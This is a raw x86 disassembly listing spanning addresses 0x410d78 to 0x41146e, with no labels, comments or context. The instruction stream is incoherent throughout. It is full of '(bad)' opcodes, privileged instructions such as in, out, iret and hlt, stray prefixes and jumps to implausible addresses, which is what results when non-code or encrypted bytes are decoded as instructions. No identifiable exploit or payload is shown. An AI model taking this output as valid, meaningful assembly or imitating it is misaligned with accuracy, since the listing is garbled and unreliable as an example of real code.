  410d78:	push   ebp
  410d79:	shr    esp,0x4d
  410d7c:	in     al,dx
  410d7d:	cmp    eax,DWORD PTR [esi+esi*2]
  410d80:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  410d86:	pushf  
  410d87:	mov    edi,0x85c7f445
  410d8d:	call   0xf886948a
  410d92:	xor    ebx,ebx
  410d94:	pushf  
  410d95:	popa   
  410d96:	push   ebx
  410d97:	dec    ebp
  410d98:	inc    ebp
  410d99:	mov    esi,DWORD PTR [eax]
  410d9b:	clc    
  410d9c:	pushf  
  410d9d:	into   
  410d9e:	mov    ecx,edi
  410da0:	in     al,dx
  410da1:	call   0x8b495364
  410da6:	pop    es
  410da7:	or     BYTE PTR [ebx],dh
  410da9:	or     BYTE PTR [edi+0x8a724d],bh
  410daf:	or     eax,edi
  410db1:	push   ebp
  410db2:	inc    ebp
  410db3:	cmpxchg8b (bad)
  410db4:	(bad)  
  410db5:	leave  
  410db6:	loopne 0x410d82
  410db8:	test   DWORD PTR [ebp-0x8],ecx
  410dbb:	mov    eax,DWORD PTR [ebp-0x18]
  410dbe:	rcl    DWORD PTR [ebp-0x29],1
  410dc1:	xor    eax,edi
  410dc3:	add    esi,eax
  410dc5:	and    eax,DWORD PTR [eax]
  410dc7:	mov    eax,DWORD PTR [eax]
  410dc9:	(bad)  
  410dca:	leave  
  410dcb:	sti    
  410dcc:	inc    ebp
  410dcd:	dec    DWORD PTR [ebx-0x39cc13ab]
  410dd3:	mov    esi,ecx
  410dd5:	clc    
  410dd6:	(bad)  
  410dd7:	dec    ebp
  410dd8:	iret   
  410dd9:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410ddf:	jb     0x410ddd
  410de1:	add    bh,al
  410de3:	inc    ebp
  410de4:	(bad)  
  410de5:	mov    eax,DWORD PTR [ebp-0xc]
  410de8:	(bad)  
  410de9:	xabort 0x65
  410dec:	loopne 0x410dbb
  410dee:	jmp    FWORD PTR [ebx]
  410df0:	mov    DWORD PTR [ebx],eax
  410df2:	clc    
  410df3:	lock inc ebp
  410df5:	dec    ebp
  410df6:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410dfc:	loopne 0x410e31
  410dfe:	inc    DWORD PTR [ebx]
  410e00:	mov    edi,DWORD PTR [ebx]
  410e02:	hlt    
  410e03:	jne    0x410e52
  410e05:	mov    esi,DWORD PTR [ebx]
  410e07:	in     al,0x8d
  410e09:	dec    ebp
  410e0a:	or     BYTE PTR [ebx],dh
  410e0c:	jb     0x410e11
  410e0e:	add    BYTE PTR [edi+0x45],bl
  410e11:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410e17:	add    BYTE PTR [ebx],dh
  410e19:	mov    esi,DWORD PTR [ebx]
  410e1b:	sub    DWORD PTR [ebx],0x6c
  410e1e:	mov    eax,DWORD PTR [ebp-0x4]
  410e21:	xor    eax,ecx
  410e23:	pushf  
  410e24:	mov    ecx,0x338545ba
  410e29:	clc    
  410e2a:	add    edx,DWORD PTR [ebp-0x77]
  410e2d:	mov    edi,eax
  410e2f:	adc    al,0x45
  410e31:	inc    ebp
  410e32:	xor    BYTE PTR [ebx-0x7f74eb64],cl
  410e38:	jmp    0x410e3b
  410e3a:	mov    eax,DWORD PTR [eax]
  410e3c:	loopne 0x410e8b
  410e3e:	inc    ebp
  410e3f:	mov    esi,DWORD PTR [ebx]
  410e41:	mov    eax,DWORD PTR [ebx]
  410e43:	nop
  410e44:	rol    DWORD PTR [eax],cl
  410e46:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  410e4c:	mov    cl,BYTE PTR [ecx+0x450bf888]
  410e52:	dec    ebp
  410e53:	push   esi
  410e54:	mov    edi,DWORD PTR [edi+0x7b608f8]
  410e5a:	xor    eax,edi
  410e5c:	mov    DWORD PTR [ebx+0x34d3208],ebx
  410e62:	mov    ecx,DWORD PTR [ecx+0x45ceec08]
  410e68:	iret   
  410e69:	xor    ecx,edx
  410e6b:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  410e72:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  410e78:	dec    ebp
  410e79:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  410e7f:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9b]
  410e86:	mov    DWORD PTR [ecx+0x8],eax
  410e89:	mov    eax,DWORD PTR [ebp-0x8]
  410e8c:	xor    ebx,DWORD PTR [eax]
  410e8e:	mov    ecx,0xff8b8d40
  410e93:	clc    
  410e94:	enter  0x4d49,0x48
  410e98:	mov    eax,edx
  410e9a:	lock enter 0x4545,0x8b
  410e9f:	mov    esi,eax
  410ea1:	cmp    dh,al
  410ea3:	rol    edi,0x3
  410ea6:	enter  0x9140,0x89
  410eaa:	inc    ebp
  410eab:	adc    al,0x8b
  410ead:	inc    ebp
  410eae:	clc    
  410eaf:	xor    eax,esi
  410eb1:	add    eax,edi
  410eb3:	mov    DWORD PTR [esi-0x24],ebx
  410eb6:	rol    DWORD PTR [ebp-0x37],0x33
  410eba:	add    al,0x3
  410ebc:	push   ebp
  410ebd:	mov    esp,ebp
  410ebf:	fsubr  st,st(4)
  410ec1:	inc    ebp
  410ec2:	(bad)  
  410ec3:	mov    edi,esp
  410ec5:	adc    BYTE PTR [ebp+0x32c3f8c7],al
  410ecb:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  410ed2:	inc    ebp
  410ed3:	test   DWORD PTR [ecx+0x454514f8],ecx
  410ed9:	cmp    al,0x8b
  410edb:	pushf  
  410edc:	nop
  410edd:	mov    DWORD PTR [eax],0x14858bd8
  410ee3:	clc    
  410ee4:	add    BYTE PTR [ebp-0x74feff77],al
  410eea:	add    ah,bh
  410eec:	or     edi,eax
  410eee:	dec    eax
  410eef:	ret    
  410ef0:	push   ebx
  410ef1:	inc    ebp
  410ef2:	dec    ebp
  410ef3:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  410ef9:	mov    DWORD PTR [esp+ebp*8+0x51],edx
  410efd:	jne    0x410f32
  410eff:	mov    edi,DWORD PTR [ebx+0x4d720c]
  410f05:	call   0xff8700cd
  410f0a:	mov    eax,DWORD PTR [ebp-0x4]
  410f0d:	mov    edi,0x4585c3d8
  410f13:	clc    
  410f14:	mov    eax,DWORD PTR [ebp-0x8]
  410f17:	xor    eax,DWORD PTR [eax+0x3]
  410f1a:	adc    DWORD PTR [eax+0xc],0x45
  410f1e:	inc    ebp
  410f1f:	push   eax
  410f20:	mov    ebx,ebp
  410f22:	clc    
  410f23:	inc    DWORD PTR [eax-0x75]
  410f26:	mov    esi,eax
  410f28:	clc    
  410f29:	rol    BYTE PTR [ebp+0x4545544e],0x33
  410f30:	je     0x410f35
  410f32:	mov    edx,DWORD PTR [eax+0x38]
  410f35:	jne    0x410f84
  410f37:	lea    ecx,[ebx-0x817ab44]
  410f3d:	mul    BYTE PTR [ebx]
  410f3f:	dec    DWORD PTR [ebx+0x4089f845]
  410f45:	fadd   DWORD PTR [ebx]
  410f47:	inc    ebp
  410f48:	jmp    0x410ed5
  410f4a:	mov    ecx,DWORD PTR [esp+edx*2]
  410f4d:	rol    DWORD PTR [ebp+0x45],0x8b
  410f51:	mov    edi,esp
  410f53:	lock (bad) 
  410f55:	dec    ebp
  410f56:	ret    
  410f57:	mov    eax,DWORD PTR [ebp+0x10]
  410f5a:	mov    eax,DWORD PTR [ecx-0x4]
  410f5d:	mov    eax,edi
  410f5f:	fadd   st,st(3)
  410f61:	enter  0x1645,0x8b
  410f65:	inc    ebp
  410f66:	cld    
  410f67:	mov    ecx,DWORD PTR [ebp+0xc]
  410f6a:	xor    ecx,DWORD PTR [ebp+0x3]
  410f6d:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  410f73:	sub    eax,DWORD PTR [ebp-0x17]
  410f76:	xor    eax,DWORD PTR [edx]
  410f78:	pushf  
  410f79:	add    bh,al
  410f7b:	or     al,0xd8
  410f7d:	jne    0x410f04
  410f7f:	(bad)  
  410f80:	clc    
  410f81:	mov    al,0x45
  410f83:	call   0xffde05c5
  410f88:	jmp    0xdd12be
  410f8d:	mov    DWORD PTR [ebp-0x30],eax
  410f90:	xor    eax,DWORD PTR [ebp+0x3]
  410f93:	xor    cl,BYTE PTR [ecx+0x45c7f49c]
  410f99:	enter  0x8503,0xc
  410f9d:	clc    
  410f9e:	inc    ebp
  410f9f:	inc    ebp
  410fa0:	(bad)  
  410fa1:	cmp    al,0xec
  410fa3:	pushf  
  410fa4:	jne    0x410f33
  410fa6:	mov    edx,eax
  410fa8:	clc    
  410fa9:	dec    ebp
  410faa:	out    dx,eax
  410fab:	(bad)  
  410fac:	dec    esp
  410fae:	mov    DWORD PTR [ebp-0x10],ecx
  410fb1:	lea    eax,[ebp-0x38]
  410fb4:	cmp    DWORD PTR [ebp-0x64],ecx
  410fb7:	lea    ecx,[ebx-0x38b2273c]
  410fbd:	mov    eax,ebx
  410fbf:	cld    
  410fc0:	(bad)  
  410fc1:	iret   
  410fc2:	mov    esp,0xf74de8cb
  410fc7:	jmp    0x8611cb
  410fcc:	test   DWORD PTR [ebx],esi
  410fce:	je     0x410f6c
  410fd0:	mov    ecx,DWORD PTR [edi]
  410fd2:	fdivr  st,st(6)
  410fd4:	mov    DWORD PTR [eax],0xe8ff8bc3
  410fda:	lock iret 
  410fdc:	inc    ebp
  410fdd:	lock push eax
  410fdf:	retf   
  410fe0:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  410fe7:	test   DWORD PTR [ebp-0x7c],0x32d89b8b
  410fee:	dec    ebp
  410fef:	mov    DWORD PTR [ebx],ebp
  410ff1:	fmul   DWORD PTR [ecx+0x458bd845]
  410ff7:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  410ffd:	enter  0x1303,0xc
  411001:	inc    ebp
  411002:	dec    ebp
  411003:	xor    edi,DWORD PTR [ebx]
  411005:	add    esi,DWORD PTR [edx+0x50]
  411008:	mov    ecx,DWORD PTR [eax+esi*8]
  41100b:	inc    ebp
  41100c:	inc    eax
  41100d:	push   eax
  41100e:	mov    ebp,esp
  411010:	lock inc DWORD PTR [ecx-0x75]
  411014:	mov    esp,esp
  411016:	fadd   DWORD PTR [eax]
  411018:	rol    edi,0xee
  41101b:	test   BYTE PTR [eax],al
  41101d:	dec    ebx
  41101e:	push   0x32
  411020:	dec    DWORD PTR [ebx-0x30ba0314]
  411026:	push   eax
  411027:	mov    dh,0x21
  411029:	add    edi,edi
  41102b:	cmp    edi,DWORD PTR [eax-0x7877af1]
  411031:	add    BYTE PTR [ebp-0x75],al
  411034:	(bad)  
  411035:	loopne 0x411003
  411037:	add    BYTE PTR [ebp+0x4584f8c7],al
  41103d:	dec    ebx
  41103e:	xor    esi,DWORD PTR [edx]
  411040:	pushf  
  411041:	mov    eax,edi
  411043:	cld    
  411044:	(bad)  
  411045:	iret   
  411046:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41104c:	mov    DWORD PTR [edi],ecx
  41104e:	in     al,0x58
  411050:	dec    ebp
  411051:	add    BYTE PTR [ecx+0x4df0e08b],cl
  411057:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41105d:	dec    ebx
  41105e:	mov    DWORD PTR [edx],esi
  411060:	fmul   QWORD PTR [ebx-0x30cc03b3]
  411066:	add    esi,DWORD PTR [esi+0x3bd80389]
  41106c:	test   DWORD PTR [edi],0x3d3800
  411072:	test   DWORD PTR [ebx+0x84dcf8],ecx
  411078:	add    edi,eax
  41107a:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  411081:	mov    eax,DWORD PTR [ebx]
  411083:	cld    
  411084:	mov    edi,ecx
  411086:	hlt    
  411087:	mov    dh,0x45
  411089:	add    esi,DWORD PTR [ebx]
  41108b:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  411091:	add    BYTE PTR [eax],al
  411093:	mov    eax,DWORD PTR [ebp-0x20]
  411096:	mov    eax,DWORD PTR [eax]
  411098:	call   0x33c55e64
  41109d:	dec    ebx
  41109e:	add    esi,DWORD PTR [edx]
  4110a0:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  4110a6:	cld    
  4110a7:	iret   
  4110a8:	(bad)  
  4110a9:	mov    ebx,es
  4110ab:	dec    ebx
  4110ac:	push   0x32
  4110ae:	lea    esi,[edx]
  4110b0:	mov    al,0x8b
  4110b2:	call   0xff4b0ba7
  4110b7:	iret   
  4110b8:	inc    ebp
  4110b9:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4110bf:	or     al,BYTE PTR ds:0xe4728b
  4110c5:	or     DWORD PTR [ebp-0x31],ecx
  4110c8:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  4110cf:	cmp    al,cl
  4110d1:	je     0x4112ab
  4110d7:	mov    eax,DWORD PTR [ebp-0x10]
  4110da:	mov    eax,DWORD PTR [eax]
  4110dc:	xor    eax,edi
  4110de:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4110e5:	mov    ecx,DWORD PTR [ebp-0x20]
  4110e8:	xor    ecx,DWORD PTR [ecx]
  4110ea:	bswap  edi
  4110ec:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  4110f4:	add    DWORD PTR [ebx+0x945dc00],ecx
  4110fa:	mov    ecx,edi
  4110fc:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411103:	or     al,BYTE PTR [eax]
  411105:	mov    ecx,DWORD PTR [ebp-0x20]
  411108:	xor    ecx,DWORD PTR [ecx]
  41110a:	bswap  edi
  41110c:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  411114:	add    DWORD PTR [edi],ecx
  411116:	add    BYTE PTR [eax-0x7474ffbb],dl
  41111c:	xor    ebx,esp
  41111e:	mov    al,BYTE PTR [eax]
  411120:	add    eax,0x8472c7
  411125:	dec    ebx
  411126:	dec    ebp
  411127:	xor    dh,BYTE PTR [ebx]
  411129:	mov    ecx,DWORD PTR [edi]
  41112b:	lock ror BYTE PTR [ecx],0xcb
  41112f:	iret   
  411130:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  411138:	inc    ebp
  411139:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41113f:	iret   
  411140:	add    eax,0x4b728c
  411145:	xor    cl,BYTE PTR [ebp+0xa]
  411148:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41114e:	or     eax,0x8c72cf
  411153:	dec    edi
  411154:	shl    DWORD PTR [edx],0x4d
  411157:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41115d:	fmul   QWORD PTR ds:0xc77200
  411163:	test   cl,al
  411165:	dec    ebx
  411166:	dec    ebp
  411167:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41116d:	or     DWORD PTR ds:0x8c72cf,ecx
  411173:	dec    ebx
  411174:	enter  0x8532,0x32
  411178:	add    BYTE PTR [ebx+0x945e000],cl
  41117e:	mov    ecx,edi
  411180:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411187:	or     al,BYTE PTR [eax]
  411189:	mov    ecx,DWORD PTR [ebp-0x24]
  41118c:	mov    ecx,DWORD PTR [ecx]
  41118e:	xor    ecx,edi
  411190:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  411197:	cmp    al,cl
  411199:	jne    0x4111e8
  41119b:	lea    ecx,[ebx-0x7517cc50]
  4111a1:	sti    
  4111a2:	or     eax,0x4d72ff
  4111a7:	cmp    eax,ecx
  4111a9:	je     0x4111f8
  4111ab:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  4111b1:	ret    
  4111b2:	or     eax,0x8b7245
  4111b7:	call   0x84c6d984
  4111bc:	add    BYTE PTR [ebx+0x33453200],bl
  4111c2:	mov    ecx,DWORD PTR [ebx+0x558afc33]
  4111c8:	add    eax,0x37233
  4111cd:	cmp    ecx,DWORD PTR [ebp+0xf]
  4111d0:	mov    esi,edi
  4111d2:	xor    edi,edi
  4111d4:	mov    cl,BYTE PTR [ebx+0x4d72fc0d]
  4111da:	add    BYTE PTR [ebx],dh
  4111dc:	rol    DWORD PTR [ebx],0x4d
  4111df:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  4111e5:	call   0x33b35ef7
  4111ea:	add    BYTE PTR [ebp+0x724d08c1],cl
  4111f0:	mov    eax,DWORD PTR [eax]
  4111f2:	xor    esi,DWORD PTR [edi-0x76]
  4111f5:	sbb    BYTE PTR ds:0x8d7275,cl
  4111fb:	cwde   
  4111fc:	enter  0x50e8,0xf3
  411200:	inc    ebp
  411201:	dec    DWORD PTR [ebx-0x7574ccbb]
  411207:	fadd   DWORD PTR ds:0xc372c7
  41120d:	ror    DWORD PTR [ebp+0x13],0x8b
  411211:	inc    ebp
  411212:	xor    esi,DWORD PTR [ebx]
  411214:	mov    al,BYTE PTR [ebx]
  411216:	or     eax,0x187250
  41121b:	inc    ebp
  41121c:	rcl    DWORD PTR [eax+0x4d],0xdc
  411220:	mov    edi,edi
  411222:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  411228:	jb     0x4111b3
  41122a:	add    ah,bl
  41122c:	shl    DWORD PTR [ebp+0x4d],0xff
  411230:	mov    ebx,esp
  411232:	xor    eax,DWORD PTR [ebp-0x76]
  411235:	add    ecx,DWORD PTR ds:0xe87208
  41123b:	repz enter 0x10ff,0x45
  411240:	inc    ebp
  411241:	mov    edx,DWORD PTR [eax-0x28]
  411244:	xor    bh,al
  411246:	inc    ebx
  411248:	mov    eax,ecx
  41124a:	mov    eax,0xa00c111
  41124f:	jne    0x411296
  411251:	mov    esi,DWORD PTR [ebx]
  411253:	test   al,0x3
  411255:	inc    ebp
  411256:	mov    DWORD PTR [eax-0xc],edx
  411259:	mov    ds:0x8b33ff45,al
  41125e:	lea    edx,[eax]
  411260:	xor    BYTE PTR [ebp+0x72],cl
  411263:	add    DWORD PTR [eax],eax
  411265:	mov    eax,edi
  411267:	lods   al,BYTE PTR ds:[esi]
  411268:	dec    ebp
  411269:	inc    ebp
  41126a:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  411270:	retf   
  411271:	mov    edx,ecx
  411273:	adc    al,0x84
  411275:	(bad)  
  411276:	std    
  411277:	ret    
  411278:	jmp    FWORD PTR [edi-0x37474bb]
  41127e:	hlt    
  41127f:	push   ebp
  411280:	(bad)  
  411281:	xor    eax,ebx
  411283:	(bad)  
  411284:	enter  0x1111,0x72
  411288:	inc    ebp
  411289:	add    BYTE PTR [ebx-0x387deb3f],cl
  41128f:	cld    
  411290:	test   bh,bh
  411292:	fwait
  411293:	inc    ebp
  411294:	xor    bl,BYTE PTR [edi-0x15]
  411297:	pop    ebx
  411298:	push   0xffffffc2
  41129a:	inc    DWORD PTR [eax]
  41129c:	in     al,dx
  41129d:	mov    eax,DWORD PTR [ebp+0x51]
  4112a0:	push   eax
  4112a1:	inc    ebp
  4112a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112a3:	mov    edi,edi
  4112a5:	or     BYTE PTR [ebx+0x4d80fc16],cl
  4112ab:	add    DWORD PTR [ebx],esi
  4112ad:	add    BYTE PTR [ebx],al
  4112af:	add    BYTE PTR [ebx],bh
  4112b1:	icebp  
  4112b2:	je     0x4112bc
  4112b4:	mov    eax,DWORD PTR [edi]
  4112b6:	cld    
  4112b7:	rol    edi,0x72
  4112ba:	ret    
  4112bb:	add    BYTE PTR [edx-0x2f],ch
  4112be:	lea    edx,[eax]
  4112c0:	cwde   
  4112c1:	jne    0x4112ab
  4112c3:	(bad)  
  4112c4:	clc    
  4112c5:	or     al,0xff
  4112c7:	inc    DWORD PTR [ebp-0x18]
  4112ca:	cmp    ebx,0x18
  4112cd:	inc    DWORD PTR [ebp+0x6]
  4112d0:	call   FWORD PTR [ebp-0x54]
  4112d3:	or     al,0x75
  4112d5:	push   ebp
  4112d6:	mov    ebp,esp
  4112d8:	test   al,0x53
  4112da:	inc    ebp
  4112db:	mov    edx,DWORD PTR [eax-0x75]
  4112de:	imul   ecx,DWORD PTR [eax],0xffffffff
  4112e1:	dec    ebp
  4112e2:	mov    edx,DWORD PTR [edi-0x4]
  4112e5:	push   esp
  4112e6:	dec    ebp
  4112e7:	push   ecx
  4112e8:	xor    esi,DWORD PTR [ebx]
  4112ea:	add    edi,DWORD PTR [edi+0x74723b]
  4112f0:	push   0xffffffc7
  4112f2:	inc    DWORD PTR [ecx]
  4112f4:	lods   al,BYTE PTR ds:[esi]
  4112f5:	inc    ebp
  4112f6:	inc    ebp
  4112f7:	mov    eax,DWORD PTR [ebx]
  4112f9:	xchg   esp,eax
  4112fa:	or     BYTE PTR [eax],al
  4112fc:	call   0xffcd0b8c
  411301:	adc    al,0x45
  411303:	or     BYTE PTR [ebx+0x800ac01],0x0
  41130a:	inc    ebp
  41130b:	inc    ecx
  41130c:	add    ecx,DWORD PTR [ebx-0x76baebec]
  411312:	mov    eax,DWORD PTR [ecx]
  411314:	call   0x338a6019
  411319:	push   0x3
  41131b:	push   0xc1300f
  411320:	dec    ebp
  411321:	jo     0x4112ae
  411323:	push   0xffffffd4
  411325:	dec    edi
  411327:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf765],ecx
  41132e:	cmp    eax,edi
  411330:	cmovne edx,DWORD PTR [edi-0x75]
  411334:	call   DWORD PTR [eax]
  411336:	mov    eax,DWORD PTR [ebp+0x8]
  411339:	call   FWORD PTR [esi+0x14]
  41133c:	leave  
  41133d:	inc    ebp
  41133e:	adc    BYTE PTR [eax+0x55],dl
  411341:	jne    0x41132f
  411343:	call   0xff5212d3
  411348:	dec    ebp
  411349:	inc    ebp
  41134a:	mov    ecx,DWORD PTR [ebx+0x390338b]
  411350:	add    BYTE PTR [ebx],bh
  411352:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  411356:	push   esp
  411357:	or     al,0x51
  411359:	dec    ebp
  41135a:	xor    DWORD PTR [ebx],0xf32039b
  411360:	cmp    eax,DWORD PTR [ebp+0x74]
  411363:	mov    edi,edi
  411365:	pop    edi
  411366:	adc    BYTE PTR [ebx+0x75],bl
  411369:	ret    0x50
  41136c:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  411370:	(bad)  
  411371:	clc    
  411372:	mov    esp,ebp
  411374:	pop    ecx
  411375:	mov    ecx,0xf80085c2
  41137a:	mov    ecx,DWORD PTR [ecx+edx*2]
  41137d:	push   esi
  41137e:	push   esi
  41137f:	(bad)  
  411380:	lock add DWORD PTR [ebp+0x44],eax
  411384:	mov    edx,DWORD PTR [eax]
  411386:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41138a:	or     BYTE PTR [edi+eax*1+0x51],dl
  41138e:	ret    
  41138f:	xor    ebx,DWORD PTR [ebx+0x37232be]
  411395:	add    BYTE PTR [ecx+0x147c8bfe],cl
  41139b:	or     al,0x80
  41139d:	jge    0x4113a0
  41139f:	mov    DWORD PTR [eax],eax
  4113a1:	and    al,0x8
  4113a3:	cmp    DWORD PTR [ebp+0x10],eax
  4113a6:	mov    edx,DWORD PTR [esi]
  4113a8:	xchg   esp,eax
  4113a9:	dec    esp
  4113aa:	add    BYTE PTR [eax],dl
  4113ac:	mov    ecx,edx
  4113ae:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4113b2:	dec    ebp
  4113b3:	into   
  4113b4:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4113ba:	mov    edx,DWORD PTR [eax+0x14]
  4113bd:	das    
  4113be:	add    al,0x45
  4113c0:	add    BYTE PTR [ebp+0x0],dh
  4113c3:	mov    edi,edi
  4113c5:	and    al,0x50
  4113c7:	mov    eax,DWORD PTR [eax]
  4113c9:	and    al,0xd1
  4113cb:	xor    eax,DWORD PTR [esi]
  4113cd:	lea    eax,[ebp+0x8]
  4113d0:	xor    esi,DWORD PTR [edx+0x3]
  4113d3:	add    BYTE PTR [ecx+0x4510fc44],cl
  4113d9:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4113df:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4113e9:	cmp    al,0xff
  4113eb:	pushf  
  4113ec:	mov    edi,edi
  4113ee:	or     BYTE PTR [esi+ecx*1],cl
  4113f1:	jne    0x4113b6
  4113f3:	call   0xa13bf
  4113f8:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4113fc:	mov    ebx,DWORD PTR [eax]
  4113fe:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  411402:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41140a:	pop    esi
  41140b:	dec    ecx
  41140d:	and    al,0x10
  41140f:	call   DWORD PTR [ebp+0x24]
  411412:	in     al,dx
  411413:	call   0xffc512fc
  411418:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41141c:	pushf  
  41141d:	pop    esi
  41141e:	mov    ebp,esp
  411420:	and    al,0xc2
  411422:	push   edi
  411423:	add    BYTE PTR [ecx+0x33],al
  411426:	mov    DWORD PTR [ebp+0x24],esi
  411429:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41142f:	dec    DWORD PTR [eax]
  411431:	and    al,0x7
  411433:	(bad)  
  411434:	cli    
  411435:	and    al,0x9b
  411437:	or     BYTE PTR [edx],dh
  411439:	sbb    BYTE PTR [ebx],al
  41143b:	adc    al,0x89
  41143d:	jmp    DWORD PTR [esp]
  411440:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  411446:	adc    al,0x8
  411448:	dec    ebp
  411449:	adc    BYTE PTR [ebp-0x7c],dh
  41144c:	mov    esi,DWORD PTR [edx]
  41144e:	and    al,0x24
  411450:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  411456:	add    edi,eax
  411458:	pcmpeqb mm1,mm2
  41145b:	jmp    0x4114a9
  41145d:	dec    DWORD PTR [eax]
  41145f:	je     0x41144c
  411461:	mov    edi,DWORD PTR [ecx]
  411463:	pop    ebp
  411464:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  411468:	fwait
  411469:	mov    DWORD PTR [eax-0x8],ebp
  41146c:	jge    0x4114d6
  41146e:	dec    DWORD PTR [ecx+0x5fbf7424]
